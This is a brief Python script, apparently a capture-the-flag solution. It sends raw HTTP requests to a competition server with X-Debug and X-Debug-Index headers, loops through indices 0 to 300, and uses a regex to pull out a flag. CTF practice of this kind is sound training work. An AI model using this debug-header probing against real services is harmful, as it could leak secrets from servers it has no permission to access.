python3 - <<'PY'
import socket, re

HOST = "gzcli.techcomfest.1pc.tf"
PORT = 33599

def grab(i: int) -> str:
    req = (
        "GET / HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        "X-Debug: true\r\n"
        f"X-Debug-Index: {i}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode()

    s = socket.create_connection((HOST, PORT), timeout=3)
    s.sendall(req)

    data = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    s.close()

    # split header/body
    parts = data.split(b"\r\n\r\n", 1)
    body = parts[1] if len(parts) == 2 else b""
    return body.decode(errors="replace").strip()

pat = re.compile(r"(TECHCOMFEST\{.*?\}|flag\{.*?\}|FLAG=.*)")

for i in range(0, 301):
    try:
        body = grab(i)
    except Exception as e:
        # kalau server crash/reset karena index ngawur, lanjut saja
        continue

    if body:
        m = pat.search(body)
        if m:
            print(f"[+] HIT index={i}: {m.group(0)}")
            break
        # kalau mau lihat semua output non-empty:
        # print(i, body)
PY
